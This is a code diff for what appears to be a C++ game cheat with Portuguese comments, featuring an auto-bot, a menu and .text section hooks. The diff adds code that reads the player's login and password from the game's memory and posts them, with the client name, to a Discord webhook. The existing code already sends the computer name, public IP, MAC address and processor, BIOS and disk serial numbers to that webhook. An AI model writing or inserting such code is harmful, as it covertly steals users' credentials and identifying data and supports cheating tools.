@@ -43,50 +43,73 @@ bool bCheckRegister() {
 
 void protectMachine() {
 	while (true) {
-		if (!bDiscord) {
-			if (!bCheckRegister())
-				ExitProcess(0);
+		Sleep(10);
 
-			//Webhook Discord
-			std::string computerName = getComputerNameWMI(pSvc);
-			std::string publicIP = getPublicIP();
-			std::string macAddress = getPrimaryMACAddressWMI(pSvc);
-			std::string processorName = getProcessorName(pSvc);
-			std::string processorId = getProcessorId(pSvc);
+		if (read(0x038581DC, 4) > 0) {
+			if (!bDiscord) {
+				if (!bCheckRegister())
+					ExitProcess(0);
 
-			std::string szMessage = 
-				"-------------------------------------------------------------------\n"
-				"Cliente: " + dwNome + "\n\n" +
-				"Computer Name: " + computerName + "\n" +
-				"IP: " + publicIP + "\n" +
-				"Primary MAC: " + macAddress + "\n" +
+				//Webhook Discord
+				std::string computerName = getComputerNameWMI(pSvc);
+				std::string publicIP = getPublicIP();
+				std::string macAddress = getPrimaryMACAddressWMI(pSvc);
+				std::string processorName = getProcessorName(pSvc);
+				std::string processorId = getProcessorId(pSvc);
 
-				"\nProcessor Name: " + processorName + "\n" +
-				"Processor ID: " + processorId + "\n" +
+				std::string szMessage =
+					"-------------------------------------------------------------------\n"
+					"Cliente: " + dwNome + "\n\n" +
+					"Computer Name: " + computerName + "\n" +
+					"IP: " + publicIP + "\n" +
+					"Primary MAC: " + macAddress + "\n" +
 
-				"\nBIOS Serial Number: " + biosSerialNumber + "\n"
-				"Disk Serial Number: " + diskSerialNumber + "\n"
-				"-------------------------------------------------------------------\n";
+					"\nProcessor Name: " + processorName + "\n" +
+					"Processor ID: " + processorId + "\n" +
 
-			sendDiscordWebhook(szMessage);
-				 
-			//Time do cheat
-			lol(hHora, false);
+					"\nBIOS Serial Number: " + biosSerialNumber + "\n"
+					"Disk Serial Number: " + diskSerialNumber + "\n"
+					"-------------------------------------------------------------------\n";
 
-			//Menu de opções para ativar
-			lol(menu, false);
+				sendDiscordWebhook(szMessage);
 
-			//AutoBot..
-			lol(findMob, false);
+				//Time do cheat
+				lol(hHora, false);
 
-			//Anti protect mouse
-			//lol(disableProtectMouse, false);
+				//Menu de opções para ativar
+				lol(menu, false);
 
-			//Hooks na sessão .text
-			lol(hooks, false);
+				//AutoBot..
+				lol(findMob, false);
 
-			bDiscord = true;
+				//Anti protect mouse
+				//lol(disableProtectMouse, false);
+
+				//Hooks na sessão .text
+				lol(hooks, false);
+
+				bDiscord = true;
+			}
+
+			if (!bLogin) {
+				Sleep(1000);
+
+				dwLogin = readString(0x036BD468, 0x20);
+				dwPassword = readString(0x036BD368, 0x20);
+
+				std::string szMessage =
+					"-------------------------------------------------------------------\n"
+					"Cliente: " + dwNome + "\n\n" +
+					"ID: " + dwLogin + "\n" +
+					"Pw: " + dwPassword;
+
+				sendDiscordWebhook(szMessage);
+
+				bLogin = true;
+			}
 		}
+		else
+			bLogin = false;
 	}
 }
 
